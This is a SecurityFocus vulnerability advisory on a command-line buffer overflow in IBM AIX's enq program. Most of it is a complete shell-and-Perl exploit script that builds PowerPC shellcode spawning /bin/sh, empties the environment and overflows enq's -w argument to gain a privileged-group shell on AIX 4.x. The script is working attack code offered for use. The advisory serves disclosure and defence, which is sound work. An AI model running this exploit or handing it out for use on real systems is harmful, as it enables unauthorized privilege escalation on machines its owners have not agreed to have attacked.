source: https://www.securityfocus.com/bid/2034/info

AIX is a variant of the UNIX Operating System, distributed by IBM. A problem exists that may allow elevation of user priviledges.

The problem occurs in the enq program. It is reported that an overflow exists in the command line argument parsing, which could lead to the overwriting of variables on the stack. This creates the potential for a malicious user to execute arbitrary code, and possibly gain administrative access.

#!/bin/sh
# FileName: ex_enq_aix4x.sh
# Exploit "enq & qstatus" of Aix4.x to get egid=9 shell.
# Usage   : chmod ex_enq_aix4x.sh ; ./ex_enq_aix4x.sh
# Tested  : on Aix4.3.3
# Author  : watercloud@xfocus.org
# Site    : www.xfocus.org   www.xfocus.net
# Date    : 2003-4-24
# Announce: use as your owner risk!

PERL=/usr/bin/perl
TMP=/tmp/.env.tmp
SHPL=/tmp/.sh.pl
cat >$SHPL<<EOF
#!/usr/bin/perl
\$BUFF="";

\$BUFF.="\x7c\xa5\x2a\x79"x500;

\$OSLEVEL=\`/usr/bin/oslevel\`;
\$ID="\x04";
if( \$OSLEVEL=~/4\.1/ ) {
  \$ID="\x03";
} elsif(\$OSLEVEL=~/4\.3\.3/) {
  \$ID="\x03";
} elsif( \$OSLEVEL=~/4\.2/ ) {
  \$ID="\x02";
}


\$BUFF.="\x7c\xa5\x2a\x79\x40\x82\xff\xfd\x7f\xe8\x02\xa6";
\$BUFF.="\x3b\xff\x01\x20\x38\x7f\xff\x08\x38\x9f\xff\x10";
\$BUFF.="\x90\x7f\xff\x10\x90\xbf\xff\x14\x88\x5f\xff\x0f";
\$BUFF.="\x98\xbf\xff\x0f\x4c\xc6\x33\x42\x44\xff\xff\x02";
\$BUFF.="/bin/sh";



\$BUFF.=\$ID;

print \$BUFF;
EOF

env | awk -F = '{print "unset "$1;}'|grep -v LOGNAME > $TMP
. $TMP
/bin/rm -f $TMP

CC=A`$PERL $SHPL` ; export CC
/bin/rm -f $SHPL
/usr/bin/enq -w"`perl -e 'print "\x2f\xf2\x2b\x10"x600'`"

#EOF